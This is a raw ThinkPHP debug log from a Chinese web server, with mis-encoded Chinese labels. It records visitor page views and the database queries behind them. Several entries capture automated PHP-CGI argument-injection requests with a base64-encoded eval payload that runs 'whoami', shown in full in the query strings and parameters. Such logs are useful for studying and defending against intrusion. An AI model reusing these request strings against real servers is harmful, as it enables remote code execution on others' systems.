[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '113.215.189.217' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000481s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000316s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '113.215.189.217'  AND `ucookie` IS NULL [ RunTime:0.006954s ]
---------------------------------------------------------------
[ 2024-09-01T14:07:05+08:00 ] 113.215.189.217 GET www.aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.041982s] [åžåçŽ‡ï¼š23.82req/s] [å†…å­˜æ¶ˆè€—ï¼š2,942.46kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'www.aosuper.com',
  'accept-encoding' => 'gzip, x-gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.3690.43 Safari/537.36',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000682s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.003801s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '113.215.189.217' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000502s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000304s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '113.215.189.217'  AND `ucookie` IS NULL [ RunTime:0.006585s ]
---------------------------------------------------------------
[ 2024-09-01T14:07:05+08:00 ] 113.215.189.217 GET www.aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.041646s] [åžåçŽ‡ï¼š24.01req/s] [å†…å­˜æ¶ˆè€—ï¼š2,942.34kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'www.aosuper.com',
  'accept-encoding' => 'gzip, x-gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.5422.66 Safari/537.36',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000813s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002739s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '113.215.189.217' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000835s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000495s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '113.215.189.217'  AND `ucookie` IS NULL [ RunTime:0.006763s ]
---------------------------------------------------------------
[ 2024-09-01T14:09:39+08:00 ] 113.215.188.105 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.081930s] [åžåçŽ‡ï¼š12.21req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.48kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'aosuper.com',
  'accept-encoding' => 'gzip, x-gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.2016.123 Safari/537.36',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000779s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.003439s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '113.215.188.105' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.034165s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000469s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '113.215.188.105' [ RunTime:0.006663s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('113.215.188.105' , 1 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 14:09:39' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000406s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '113.215.188.105'  AND `ucookie` IS NULL [ RunTime:0.006018s ]
---------------------------------------------------------------
[ 2024-09-01T14:09:39+08:00 ] 113.215.188.105 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.041241s] [åžåçŽ‡ï¼š24.25req/s] [å†…å­˜æ¶ˆè€—ï¼š2,942.34kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'aosuper.com',
  'accept-encoding' => 'gzip, x-gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.9286.136 Safari/537.36',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000645s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002899s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '113.215.188.105' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000439s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000314s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '113.215.188.105'  AND `ucookie` IS NULL [ RunTime:0.006873s ]
---------------------------------------------------------------
[ 2024-09-01T14:09:58+08:00 ] 113.215.189.192 GET www.aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.057435s] [åžåçŽ‡ï¼š17.41req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.61kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'www.aosuper.com',
  'accept-encoding' => 'gzip, x-gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.3105.101 Safari/537.36',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000860s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002756s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '113.215.189.192' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000973s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000376s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '113.215.189.192' [ RunTime:0.007161s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('113.215.189.192' , 2 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 14:09:58' , 3 , 'æ™®é€šç½‘å‹') [ RunTime:0.000471s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '113.215.189.192'  AND `ucookie` IS NULL [ RunTime:0.006331s ]
---------------------------------------------------------------
[ 2024-09-01T14:09:58+08:00 ] 113.215.189.192 GET www.aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.040626s] [åžåçŽ‡ï¼š24.61req/s] [å†…å­˜æ¶ˆè€—ï¼š2,942.46kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'www.aosuper.com',
  'accept-encoding' => 'gzip, x-gzip, deflate',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.7758.129 Safari/537.36',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000856s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002811s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '113.215.189.192' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000447s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000301s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '113.215.189.192'  AND `ucookie` IS NULL [ RunTime:0.006535s ]
---------------------------------------------------------------
[ 2024-09-01T14:30:46+08:00 ] 147.78.47.62 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.019478s] [åžåçŽ‡ï¼š51.34req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T14:30:48+08:00 ] 147.78.47.62 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015432s] [åžåçŽ‡ï¼š64.80req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T15:35:23+08:00 ] 147.78.47.62 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.014709s] [åžåçŽ‡ï¼š67.99req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T15:35:27+08:00 ] 147.78.47.62 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015641s] [åžåçŽ‡ï¼š63.93req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T16:41:48+08:00 ] 147.78.47.62 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.045142s] [åžåçŽ‡ï¼š22.15req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T16:41:51+08:00 ] 147.78.47.62 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.016045s] [åžåçŽ‡ï¼š62.32req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T17:41:34+08:00 ] 147.78.47.62 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015796s] [åžåçŽ‡ï¼š63.31req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T17:41:36+08:00 ] 147.78.47.62 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.014921s] [åžåçŽ‡ï¼š67.02req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T17:55:45+08:00 ] 182.40.104.255 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.839665s] [åžåçŽ‡ï¼š1.19req/s] [å†…å­˜æ¶ˆè€—ï¼š2,949.94kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'upgrade-insecure-requests' => '1',
  'referer' => 'http://aosuper.com',
  'pragma' => 'no-cache',
  'connection' => 'close',
  'cache-control' => 'no-cache',
  'accept-language' => 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.011130s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.044726s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '182.40.104.255' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.183907s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-09' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000600s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '182.40.104.255' [ RunTime:0.027695s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('182.40.104.255' , 3 , '2024-09' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-09-01 17:55:45' , 5 , 'æ™®é€šç½‘å‹') [ RunTime:0.000607s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '182.40.104.255'  AND `ucookie` IS NULL [ RunTime:0.007376s ]
---------------------------------------------------------------
[ 2024-09-01T18:59:12+08:00 ] 141.98.81.44 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.031472s] [åžåçŽ‡ï¼š31.77req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T18:59:15+08:00 ] 141.98.81.44 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015589s] [åžåçŽ‡ï¼š64.15req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-09-01T20:04:18+08:00 ] 194.9.191.20 GET www.aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š1.448138s] [åžåçŽ‡ï¼š0.69req/s] [å†…å­˜æ¶ˆè€—ï¼š2,946.27kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'tr,tr-TR,az,az-AZ,en-US,en;q=0.5',
  'connection' => 'keep-alive',
